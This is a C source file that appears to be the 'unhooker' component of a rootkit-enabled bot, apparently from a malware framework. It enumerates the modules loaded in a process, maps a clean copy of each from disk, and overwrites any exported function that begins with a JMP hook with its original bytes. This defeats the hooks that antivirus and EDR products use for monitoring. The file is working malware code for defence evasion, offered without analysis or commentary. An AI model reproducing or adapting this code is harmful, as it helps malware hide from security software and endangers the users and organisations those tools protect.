#include "unhooker.h"

#ifdef MODULE_ROOTKIT
#include "../common/mem.h"
#include "../common/string.h"

#include "hook_manager.h"

extern bot_t bot;

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

static void _UnhookFunctions(HANDLE hMap, HMODULE hModule)
{
	PIMAGE_OPTIONAL_HEADER poh;
	PIMAGE_EXPORT_DIRECTORY ped;
	ULONG *functionEntryPoints;
	DWORD *pdwNamePtr, dwOriginalFunction, dwHookedFunction;
	WORD *pwOrdinalPtr;
	unsigned int i;
	BYTE hookedBytes[10], originalBytes[10];
	char* pszFunction;
	
	poh = (PIMAGE_OPTIONAL_HEADER)( (char*)hMap + ( (PIMAGE_DOS_HEADER)hMap)->e_lfanew + sizeof( DWORD ) + sizeof( IMAGE_FILE_HEADER ) );
	ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA( hMap, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );	
	functionEntryPoints  = (ULONG*)( (ULONG)hMap + ped->AddressOfFunctions );

	pdwNamePtr  = (DWORD*)RVATOVA(hMap, ped->AddressOfNames);
	pwOrdinalPtr = (WORD*)RVATOVA(hMap, ped->AddressOfNameOrdinals);

	for ( i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
	{
		pszFunction = (char*)RVATOVA( hMap, *pdwNamePtr );

		memzero(&hookedBytes, sizeof(hookedBytes));
		memzero(&originalBytes, sizeof(originalBytes));

		dwHookedFunction = (DWORD)CWA(GetProcAddress)(hModule, pszFunction);
		dwOriginalFunction = ((DWORD)((DWORD)hMap + functionEntryPoints[(int)*pwOrdinalPtr]));

		memcopy(hookedBytes, (LPVOID)dwHookedFunction, 10);
		memcopy(originalBytes, (LPVOID)dwOriginalFunction, 10);

		if(hookedBytes[0] == 0xE9)
		{
			ReplaceFunction(dwHookedFunction, originalBytes, 10);
		}
	}
}

static void _UnhookModule(HMODULE hModule, const LPWSTR pwzOriginalModulePath)
{
	HANDLE hFile, hMapping, hMap;

	if((hFile = CWA(CreateFileW)(pwzOriginalModulePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE)
		return;

	hMapping = 0;
	hMap = 0;

	do
	{
		if((hMapping = CreateFileMappingW( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 )) == INVALID_HANDLE_VALUE)
			break;

		if((hMap = CWA(MapViewOfFile)( hMapping, FILE_MAP_READ, 0, 0, 0 )) == INVALID_HANDLE_VALUE)
			break;

		_UnhookFunctions(hMap, hModule);
	}
	while(FALSE);

	if(hMap != 0)
		CWA(UnmapViewOfFile)(hMap);

	if(hMapping != 0)
		CWA(NtClose)(hMapping);

	CWA(NtClose)(hFile);
}

void WINAPI RunUnhooker(void)
{
	HANDLE hSnapshot;
	MODULEENTRY32W me32;
	wchar_t wzModulePath[MAX_PATH];

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0)) == INVALID_HANDLE_VALUE)
		return;

	memzero(&me32, sizeof(MODULEENTRY32W));
	me32.dwSize = sizeof(MODULEENTRY32W);

	if (Module32FirstW(hSnapshot, &me32))
	{
		do
		{
			memzero(&wzModulePath, sizeof(wzModulePath));

			if (bot.api.pGetModuleFileNameW(me32.hModule, wzModulePath, MAX_PATH) == 0)
				continue;

			if(StrCompareStartW(bot.wzBotPath, wzModulePath))
				continue;

			_UnhookModule(me32.hModule, wzModulePath);
		} 
		while (Module32NextW(hSnapshot, &me32));
	}

	CWA(NtClose)(hSnapshot);
}


#endif